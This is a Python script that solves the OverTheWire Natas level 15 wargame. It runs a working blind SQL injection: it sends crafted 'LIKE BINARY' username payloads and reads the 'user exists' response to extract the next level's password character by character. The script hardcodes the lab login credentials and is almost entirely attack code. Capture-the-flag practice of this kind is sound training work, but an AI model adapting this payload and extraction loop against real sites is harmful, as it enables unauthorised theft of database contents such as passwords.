import requests
import string
import re

def naive_approach(url:str, characters):
    password = ''
    for i in range(32):
        for char in characters:
            testString = password + char
            string =  {'username' : 'natas16" AND password LIKE BINARY "'+testString+'%'}

            print(string)

            response = requests.post(url=url, data=string, auth=("natas15","TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"))
            r = response.text
            user_exists = re.search("[a-zA-Z]*user exists",r)
            print(user_exists)

            if user_exists:
                password += char
                print(password)
                break

    print(password)    
    return password
        

def optimized_algo(url:str, chars):
    pass_chars = []
    for char in characters:
        string =  {'username' : 'natas16" AND password LIKE BINARY "%'+char+'%'}

        response = requests.post(url=url, data=string, auth=("natas15","TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"))
        r=response.text
        user_exists= re.search("[a-zA-Z]*user exists",r)
        print(user_exists)

        if(user_exists):
            pass_chars.append(char)
            print(pass_chars)

    password = naive_approach(url, pass_chars)    
    print(password)
    return password


characters = string.ascii_letters + string.digits
print(characters)

url = 'http://natas15.natas.labs.overthewire.org/index.php'
# # headers = {
# #     "Content-Type" : "text/html; charset=UTF-8",
# #     "Authorization" : "Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="
# #     }
print(optimized_algo(url, characters))